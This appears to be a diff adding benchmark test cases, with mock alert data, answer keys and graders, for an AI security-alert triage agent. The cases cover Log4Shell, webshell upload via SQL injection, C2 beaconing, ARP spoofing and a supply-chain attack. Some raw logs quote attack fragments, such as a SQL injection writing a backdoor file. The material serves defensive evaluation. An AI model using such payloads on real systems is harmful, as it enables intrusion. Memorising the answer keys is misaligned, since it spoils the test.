+        "payload_highlights": ["Log4j JNDI injection", "callback to malicious.ldap"],
+        "related_iocs": [
+          { "type": "ip", "value": "192.0.2.200" },
+          { "type": "domain", "value": "malicious.ldap" }
+        ]
+      },
+      "query_asset_info_10.0.2.88": {
+        "ip": "10.0.2.88",
+        "hostname": "java-app-02",
+        "os": "CentOS 8",
+        "department": "研发中心",
+        "business_system": "客户自助服务门户（Java）",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "java.dev@company.com",
+        "network_zone": "生产-DMZ",
+        "tags": ["java", "log4j", "public"]
+      },
+      "query_threat_intel_ip_192.0.2.200": {
+        "ioc_type": "ip",
+        "ioc_value": "192.0.2.200",
+        "is_malicious": true,
+        "reputation_score": 6,
+        "threat_tags": ["exploit", "C2"],
+        "associated_apt": null,
+        "first_seen": "2026-07-12",
+        "last_seen": "2026-07-14",
+        "geo_location": "RU",
+        "source": "GreyNoise, AlienVault",
+        "confidence": "high",
+        "raw_intel": "IP actively scanning for Log4Shell, deploying post-exploitation tools."
+      },
+      "query_threat_intel_domain_malicious.ldap": {
+        "ioc_type": "domain",
+        "ioc_value": "malicious.ldap",
+        "is_malicious": true,
+        "reputation_score": 4,
+        "threat_tags": ["C2", "exploit"],
+        "associated_apt": null,
+        "first_seen": "2026-07-13",
+        "last_seen": "2026-07-14",
+        "geo_location": null,
+        "source": "DNSFilter",
+        "confidence": "high",
+        "raw_intel": "Malicious LDAP server used to deliver secondary payloads via Log4Shell."
+      },
+      "query_related_alerts_10.0.2.88_48h": {
+        "query_params": { "ip": "10.0.2.88", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A15-REL-01",
+            "alert_type": "Suspicious Outbound Connection",
+            "severity": "high",
+            "timestamp": "2026-07-14T05:16:00Z",
+            "summary": "Host 10.0.2.88 made outbound connection to 198.51.100.44:4444, signature matches Cobalt Strike beacon."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "exploitation",
+        "min_confidence": 0.92,
+        "key_evidence_must_include": [
+          "成功注入 JNDI 调用并回连恶意 LDAP 服务器",
+          "情报标记攻击 IP 和 LDAP 域名为 Log4Shell 利用基础设施",
+          "关联告警检测到 Cobalt Strike Beacon，确认主机已失陷"
+        ],
+        "key_evidence_must_not_include": ["漏洞利用被 WAF 成功阻断"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离 10.0.2.88，阻断出站 4444 端口",
+        "升级 Log4j 至安全版本或应用 workaround",
+        "全网扫描 Log4Shell 受影响应用并修补"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A16",
+    "scenario": "VPN 登录地点异常，但为员工出差使用个人设备（误报）",
+    "difficulty": "medium",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "vpn_anomaly",
+    "input": {
+      "alert_id": "A16",
+      "trigger_context": "VPN 告警：用户 alice 从境外 IP 203.0.113.55 登录，与常用城市不符，且为新设备。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A16": {
+        "alert_id": "A16",
+        "severity_original": "medium",
+        "rule_name": "Impossible Travel - VPN Login from Anomalous Location",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-11T14:30:00Z",
+        "raw_log": "VPN user alice authenticated from 203.0.113.55 (SG) while previous login was 2 hours ago from 10.0.3.0/24 (office). Device ID: NEW-DEVICE-001",
+        "source_ip": "203.0.113.55",
+        "destination_ip": "10.0.7.1",
+        "source_port": 21433,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["impossible travel: office to Singapore in 2 hours", "new device ID"],
+        "related_iocs": [
+          { "type": "ip", "value": "203.0.113.55" }
+        ]
+      },
+      "query_asset_info_10.0.7.1": {
+        "ip": "10.0.7.1",
+        "hostname": "vpn-gateway-01",
+        "os": "Linux",
+        "department": "运维部",
+        "business_system": "员工 VPN 网关",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "netsec@company.com",
+        "network_zone": "办公网",
+        "tags": ["vpn", "gateway"]
+      },
+      "query_threat_intel_ip_203.0.113.55": {
+        "ioc_type": "ip",
+        "ioc_value": "203.0.113.55",
+        "is_malicious": false,
+        "reputation_score": 90,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": "SG",
+        "source": "Internal Travel Notification",
+        "confidence": "medium",
+        "raw_intel": "This IP is a known hotel Wi-Fi in Singapore where employee alice is on business trip as per HR record."
+      },
+      "query_related_alerts_203.0.113.55_48h": {
+        "query_params": { "ip": "203.0.113.55", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "IP 203.0.113.55 对应新加坡酒店 Wi-Fi，与 HR 出差记录相符",
+          "情报未标记为恶意，用户 alice 有授权出差"
+        ],
+        "key_evidence_must_not_include": ["账户遭 APT 组织劫持", "恶意 VPN 登录"]
+      },
+      "expected_remediation_must_include": [
+        "确认员工出差申请后关闭告警",
+        "提示用户通过公司 VPN 客户端进行额外 MFA 验证"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail 和 intel" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A17",
+    "scenario": "扫描后利用：外部 IP 扫描发现漏洞后植入后门",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "exploitation",
+    "input": {
+      "alert_id": "A17",
+      "trigger_context": "WAF+EDR 联动：外部 IP 203.0.113.40 先扫描 /admin 目录，随后成功利用 SQL 注入上传后门。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A17": {
+        "alert_id": "A17",
+        "severity_original": "critical",
+        "rule_name": "SQL Injection to WebShell Upload - Sequential Attack Pattern",
+        "source": "WAF",
+        "timestamp": "2026-07-12T17:55:00Z",
+        "raw_log": "Scan phase: GET /admin/login.php?attempt=1... Exploit phase: POST /admin/products.php?id=1 UNION SELECT ... INTO OUTFILE '/var/www/html/backdoor.php'",
+        "source_ip": "203.0.113.40",
+        "destination_ip": "10.0.2.77",
+        "source_port": 62444,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["directory scan for admin panels", "SQL injection writing WebShell", "backdoor.php created"],
+        "related_iocs": [
+          { "type": "ip", "value": "203.0.113.40" },
+          { "type": "url", "value": "http://10.0.2.77/backdoor.php" }
+        ]
+      },
+      "query_asset_info_10.0.2.77": {
+        "ip": "10.0.2.77",
+        "hostname": "legacy-app-01",
+        "os": "CentOS 7",
+        "department": "市场部",
+        "business_system": "旧版产品目录系统",
+        "asset_level": "medium",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "web-legacy@company.com",
+        "network_zone": "生产-DMZ",
+        "tags": ["legacy", "php", "public"]
+      },
+      "query_threat_intel_ip_203.0.113.40": {
+        "ioc_type": "ip",
+        "ioc_value": "203.0.113.40",
+        "is_malicious": true,
+        "reputation_score": 11,
+        "threat_tags": ["scanning", "sqli", "webshell"],
+        "associated_apt": null,
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-12",
+        "geo_location": "CN",
+        "source": "AlienVault, EmergingThreats",
+        "confidence": "high",
+        "raw_intel": "IP involved in automated scanning for SQLi vulnerabilities and webshell deployment."
+      },
+      "query_threat_intel_url_http://10.0.2.77/backdoor.php": {
+        "ioc_type": "url",
+        "ioc_value": "http://10.0.2.77/backdoor.php",
+        "is_malicious": false,
+        "reputation_score": null,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "N/A",
+        "confidence": "low",
+        "raw_intel": "No external threat intel for this internal URL. It is the result of the attack."
+      },
+      "query_related_alerts_203.0.113.40_48h": {
+        "query_params": { "ip": "203.0.113.40", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A17-REL-01",
+            "alert_type": "Web Scan",
+            "severity": "low",
+            "timestamp": "2026-07-12T17:50:00Z",
+            "summary": "IP 203.0.113.40 scanned for common admin paths on 10.0.2.77."
+          },
+          {
+            "alert_id": "A17-REL-02",
+            "alert_type": "SQL Injection Attempt",
+            "severity": "medium",
+            "timestamp": "2026-07-12T17:54:00Z",
+            "summary": "Multiple SQL injection attempts detected from same IP on products.php."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "exploitation",
+        "min_confidence": 0.88,
+        "key_evidence_must_include": [
+          "攻击序列包含扫描、SQL 注入、写入 WebShell 文件 backdoor.php",
+          "源 IP 被情报标记为自动化 SQLi 扫描及后门部署",
+          "关联告警在 5 分钟内完成扫描到利用全过程"
+        ],
+        "key_evidence_must_not_include": ["WebShell 上传是正常开发行为"]
+      },
+      "expected_remediation_must_include": [
+        "立即移除 /var/www/html/backdoor.php，封锁 IP 203.0.113.40",
+        "审计并修补 SQL 注入漏洞，使用参数化查询",
+        "检查数据库是否泄露，审查近期数据变更"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A18",
+    "scenario": "HTTPS C2 信标检测，关联前期 Dropper 执行",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "c2_communication",
+    "input": {
+      "alert_id": "A18",
+      "trigger_context": "EDR 检测到主机 10.0.3.33 每 120 秒向域名 beacon.bad 发送 HTTPS POST 请求，符合 C2 信标模式。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A18": {
+        "alert_id": "A18",
+        "severity_original": "high",
+        "rule_name": "C2 Beacon Detected - Periodic HTTPS POST to Known Malicious Domain",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-13T20:45:10Z",
+        "raw_log": "Process updater.exe (PID 3140) POST https://beacon.bad/login every 120s, payload size 345 bytes, consistent JA3 hash.",
+        "source_ip": "10.0.3.33",
+        "destination_ip": "198.51.100.150",
+        "source_port": 59123,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["periodic beacon interval 120s", "domain beacon.bad is C2", "process updater.exe masquerading"],
+        "related_iocs": [
+          { "type": "domain", "value": "beacon.bad" },
+          { "type": "hash", "value": "e3b4c5d6a7f8e9d0c1b2a3f4e5d6c7b8" }
+        ]
+      },
+      "query_asset_info_10.0.3.33": {
+        "ip": "10.0.3.33",
+        "hostname": "design-ws-04",
+        "os": "Windows 10 21H2",
+        "department": "设计部",
+        "business_system": "设计师工作站",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "designer04@company.com",
+        "network_zone": "办公网",
+        "tags": ["workstation", "design"]
+      },
+      "query_threat_intel_domain_beacon.bad": {
+        "ioc_type": "domain",
+        "ioc_value": "beacon.bad",
+        "is_malicious": true,
+        "reputation_score": 2,
+        "threat_tags": ["C2", "beacon"],
+        "associated_apt": null,
+        "first_seen": "2026-07-05",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "DomainTools, VirusTotal",
+        "confidence": "high",
+        "raw_intel": "Domain used by Cobalt Strike team server infrastructure, frequently rotated."
+      },
+      "query_threat_intel_hash_e3b4c5d6a7f8e9d0c1b2a3f4e5d6c7b8": {
+        "ioc_type": "hash",
+        "ioc_value": "e3b4c5d6a7f8e9d0c1b2a3f4e5d6c7b8",
+        "is_malicious": true,
+        "reputation_score": 3,
+        "threat_tags": ["dropper", "trojan"],
+        "associated_apt": null,
+        "first_seen": "2026-07-12",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "HybridAnalysis",
+        "confidence": "high",
+        "raw_intel": "SHA256 of updater.exe is a known dropper that downloads Cobalt Strike beacon payload."
+      },
+      "query_related_alerts_10.0.3.33_48h": {
+        "query_params": { "ip": "10.0.3.33", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A18-REL-01",
+            "alert_type": "Suspicious Download",
+            "severity": "medium",
+            "timestamp": "2026-07-13T19:30:00Z",
+            "summary": "User downloaded updater.exe from shareware-site.com via browser."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "c2_communication",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "信标域名 beacon.bad 为已知 C2，信标周期 120 秒符合 Cobalt Strike 特征",
+          "进程 updater.exe 的哈希被确认为投放 Cobalt Strike 的 Dropper",
+          "关联告警显示 1 小时前用户从可疑站点下载了该文件"
+        ],
+        "key_evidence_must_not_include": ["信标流量是正常的软件更新检查"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离主机 10.0.3.33，阻断域名 beacon.bad",
+        "从主机中清除 Cobalt Strike Beacon，检查是否有横向移动迹象",
+        "教育用户不要从非可信来源下载软件"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A19",
+    "scenario": "IoT 设备异常流量告警实为固件更新（误报）",
+    "difficulty": "medium",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "iot_anomaly",
+    "input": {
+      "alert_id": "A19",
+      "trigger_context": "IoT 安全网关告警：IP 10.0.8.200（智能摄像头）在凌晨 3 点向外传输 500MB 数据，异常大流量。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A19": {
+        "alert_id": "A19",
+        "severity_original": "medium",
+        "rule_name": "IoT Anomaly - Abnormal Outbound Data Volume from Camera",
+        "source": "IoT-Security",
+        "timestamp": "2026-07-11T03:10:15Z",
+        "raw_log": "Device 10.0.8.200 (cam-01) sent 500MB to 203.0.113.200 (cdn-update.com) over HTTP.",
+        "source_ip": "10.0.8.200",
+        "destination_ip": "203.0.113.200",
+        "source_port": 50234,
+        "destination_port": 80,
+        "protocol": "TCP",
+        "payload_highlights": ["500MB outbound from camera", "destination cdn-update.com"],
+        "related_iocs": [
+          { "type": "domain", "value": "cdn-update.com" }
+        ]
+      },
+      "query_asset_info_10.0.8.200": {
+        "ip": "10.0.8.200",
+        "hostname": "cam-01",
+        "os": "RTOS",
+        "department": "行政部",
+        "business_system": "办公区监控摄像头",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "facility@company.com",
+        "network_zone": "IoT网段",
+        "tags": ["iot", "camera", "surveillance"]
+      },
+      "query_threat_intel_domain_cdn-update.com": {
+        "ioc_type": "domain",
+        "ioc_value": "cdn-update.com",
+        "is_malicious": false,
+        "reputation_score": 88,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": "2020-01-01",
+        "last_seen": "2026-07-11",
+        "geo_location": null,
+        "source": "VirusTotal, DNSFilter",
+        "confidence": "medium",
+        "raw_intel": "Domain belongs to a legitimate CDN provider used by many IoT manufacturers for firmware updates. Not malicious."
+      },
+      "query_related_alerts_10.0.8.200_48h": {
+        "query_params": { "ip": "10.0.8.200", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A19-REL-01",
+            "alert_type": "Firmware Update Notification",
+            "severity": "info",
+            "timestamp": "2026-07-11T03:00:00Z",
+            "summary": "Camera cam-01 initiated scheduled firmware update check per vendor policy."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.92,
+        "key_evidence_must_include": [
+          "目标域名 cdn-update.com 为合法 CDN 提供商，无恶意记录",
+          "关联信息显示为计划固件更新",
+          "摄像头资产为普通办公监控，无敏感数据"
+        ],
+        "key_evidence_must_not_include": ["摄像头被僵尸网络控制发起 DDoS"]
+      },
+      "expected_remediation_must_include": [
+        "将此摄像头固件更新流量加入 IoT 基线白名单",
+        "确认固件更新策略合理，避免类似误报"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail 和 intel" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A20",
+    "scenario": "ARP 欺骗攻击，内部主机冒充网关 MAC 地址",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "arp_spoofing",
+    "input": {
+      "alert_id": "A20",
+      "trigger_context": "网络检测：IP 10.0.5.50 发送大量 ARP 回复声称自己是默认网关 10.0.5.1，疑似中间人攻击。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A20": {
+        "alert_id": "A20",
+        "severity_original": "high",
+        "rule_name": "ARP Spoofing Detected - Gateway MAC Mismatch",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-14T09:12:44Z",
+        "raw_log": "ARP reply from 10.0.5.50 claiming 10.0.5.1 has MAC 00:11:22:33:44:66, real gateway MAC is 00:aa:bb:cc:dd:ee. Traffic redirected.",
+        "source_ip": "10.0.5.50",
+        "destination_ip": "10.0.5.1",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": "ARP",
+        "payload_highlights": ["ARP cache poisoning", "attacker MAC 00:11:22:33:44:66", "gateway impersonation"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.5.50" }
+        ]
+      },
+      "query_asset_info_10.0.5.50": {
+        "ip": "10.0.5.50",
+        "hostname": "office-pc-unknown",
+        "os": "Unknown",
+        "department": "未知",
+        "business_system": "未注册设备",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "unknown",
+        "network_zone": "办公网",
+        "tags": ["rogue-device", "unmanaged"]
+      },
+      "query_threat_intel_ip_10.0.5.50": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.5.50",
+        "is_malicious": false,
+        "reputation_score": null,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "low",
+        "raw_intel": "No external intelligence for this internal IP. The behavior itself is the indicator."
+      },
+      "query_related_alerts_10.0.5.50_48h": {
+        "query_params": { "ip": "10.0.5.50", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A20-REL-01",
+            "alert_type": "New Device Detected",
+            "severity": "info",
+            "timestamp": "2026-07-14T08:55:00Z",
+            "summary": "Unmanaged device with MAC 00:11:22:33:44:66 connected to office switch port 12."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "arp_spoofing",
+        "min_confidence": 0.85,
+        "key_evidence_must_include": [
+          "检测到 ARP 回复冒充网关 10.0.5.1 的 MAC 地址",
+          "攻击设备为未注册的陌生设备，关联告警显示刚接入网络",
+          "存在中间人攻击风险，可截获办公网敏感通信"
+        ],
+        "key_evidence_must_not_include": ["该行为是网络管理员的正常 ARP 广播"]
+      },
+      "expected_remediation_must_include": [
+        "立即从交换机端口 12 关闭或隔离该设备",
+        "在网关和终端上绑定正确的 ARP 表项",
+        "全网启用 DAI (Dynamic ARP Inspection) 防止 ARP 欺骗"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail 和 related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A21",
+    "scenario": "软件供应链攻击：内部更新服务器分发恶意包",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "supply_chain",
+    "input": {
+      "alert_id": "A21",
+      "trigger_context": "EDR 告警：多台主机从内部更新源 10.0.1.100 下载了含有恶意代码的软件包。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A21": {
+        "alert_id": "A21",
+        "severity_original": "critical",
+        "rule_name": "Supply Chain Compromise - Malicious Package from Internal Repository",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-13T15:40:00Z",
+        "raw_log": "Host 10.0.3.80 downloaded chrome-update.msi from http://repo.internal/chrome-update.msi, digital signature invalid, contains trojan.win32.agent.",
+        "source_ip": "10.0.3.80",
+        "destination_ip": "10.0.1.100",
+        "source_port": 54678,
+        "destination_port": 80,
+        "protocol": "TCP",
+        "payload_highlights": ["invalid digital signature on MSI", "trojan.win32.agent detected", "internal repo serving malicious file"],
+        "related_iocs": [
+          { "type": "hash", "value": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7" },
+          { "type": "url", "value": "http://repo.internal/chrome-update.msi" }
+        ]
+      },
+      "query_asset_info_10.0.1.100": {
+        "ip": "10.0.1.100",
+        "hostname": "repo-server-01",
+        "os": "Ubuntu 22.04",
+        "department": "运维部",
+        "business_system": "内部软件仓库",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "repo.admin@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["repository", "critical", "software-update"]
+      },
+      "query_threat_intel_hash_b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7": {
+        "ioc_type": "hash",
+        "ioc_value": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
+        "is_malicious": true,
+        "reputation_score": 5,
+        "threat_tags": ["trojan", "downloader"],
+        "associated_apt": "APT41",
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "VirusTotal, Mandiant",
+        "confidence": "high",
+        "raw_intel": "Trojanized installer attributed to APT41 supply chain operation. Once executed, installs backdoor and connects to C2."
+      },
+      "query_related_alerts_10.0.1.100_48h": {
+        "query_params": { "ip": "10.0.1.100", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 3,
+        "related_alerts": [
+          {
+            "alert_id": "A21-REL-01",
+            "alert_type": "Suspicious File Upload",
+            "severity": "high",
+            "timestamp": "2026-07-13T14:00:00Z",
+            "summary": "Compromised admin account uploaded chrome-update.msi to repo-server-01."
+          },
+          {
+            "alert_id": "A21-REL-02",
+            "alert_type": "C2 Beacon",
+            "severity": "high",
+            "timestamp": "2026-07-13T15:50:00Z",
+            "summary": "Multiple hosts start beaconing to known APT41 C2 after executing the trojanized installer."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "supply_chain",
+        "min_confidence": 0.93,
+        "key_evidence_must_include": [
+          "内部仓库分发的 chrome-update.msi 数字签名无效且包含木马",
+          "文件哈希关联至 APT41 供应链攻击行动",
+          "关联告警显示管理员账户被滥用来上传恶意包，且多主机已产生 C2 通信"
+        ],
+        "key_evidence_must_not_include": ["该文件为误报，数字签名未通过是证书过期"]
+      },
+      "expected_remediation_must_include": [
+        "立即下线 repo-server-01，移除恶意 MSI 文件",
+        "隔离所有下载并执行了该包的终端，清除后门",
+        "审查并重置所有仓库管理员账户凭据",
+        "对软件仓库实施代码签名强制和上传审批流程"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A22",
+    "scenario": "Web 应用安全扫描器触发大量探测告警（误报）",
+    "difficulty": "medium",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "scanning",
+    "input": {
+      "alert_id": "A22",
+      "trigger_context": "WAF 告警：IP 10.0.5.110 对多个 Web 应用发起 SQLi、XSS 探测，但该 IP 为内部 AppScan 扫描器。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A22": {
+        "alert_id": "A22",
+        "severity_original": "medium",
+        "rule_name": "Web Application Scan - Multiple Attack Signatures Detected",
+        "source": "WAF",
+        "timestamp": "2026-07-10T23:00:45Z",
+        "raw_log": "From 10.0.5.110: numerous requests with SQLi and XSS payloads to various .com domains.",
+        "source_ip": "10.0.5.110",
+        "destination_ip": "10.0.2.200",
+        "source_port": 34567,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["SQL injection attempt", "XSS vectors", "over 2000 requests in 30 min"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.5.110" }
+        ]
+      },
+      "query_asset_info_10.0.5.110": {
+        "ip": "10.0.5.110",
+        "hostname": "appsec-scanner-01",
+        "os": "Linux",
+        "department": "信息安全部",
+        "business_system": "HCL AppScan 自动化扫描器",
+        "asset_level": "medium",
+        "is_scanner": true,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "appsec@company.com",
+        "network_zone": "办公网",
+        "tags": ["scanner", "appsec", "authorized"]
+      },
+      "query_threat_intel_ip_10.0.5.110": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.5.110",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
